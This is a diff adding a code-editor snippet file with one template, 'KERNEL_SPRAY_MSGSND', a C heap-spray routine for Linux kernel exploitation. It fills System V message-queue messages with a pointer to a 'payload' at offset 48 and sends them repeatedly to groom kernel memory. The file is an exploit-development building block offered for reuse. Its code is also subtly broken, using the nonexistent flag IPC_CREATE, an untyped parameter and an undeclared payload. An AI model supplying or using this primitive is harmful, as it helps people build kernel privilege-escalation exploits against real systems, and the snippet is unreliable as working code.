@@ -1,0 +1,7 @@
+{
+  "KERNEL_SPRAY_MSGSND": {
+    "prefix": "KERNEL_SPRAY_MSGSND",
+    "body": "#define BUFF_SIZE 0x100\n#define HEAP_SPRAY_TIMES 0x100\n\nvoid msgsnd_spray(fd){\n  struct {\n    int mtype;\n    char mtext[BUFF_SIZE];\n  } msg;\n  msg.mtype = 1;\n  *(uint64_t **)(msg.mtext + 48) = &payload;\n  \n  int msgid = msgget(\n    IPC_PRIVATE, 0644 | IPC_CREATE\n  );\n\n  for(int i = 0; i < HEAP_SPRAY_TIMES; ++i)\n    msgsnd(msgid, &msg, BUFF_SIZE, 0);\n}",
+    "description": "Kernel spray msgsnd >= 48"
+  }
+}
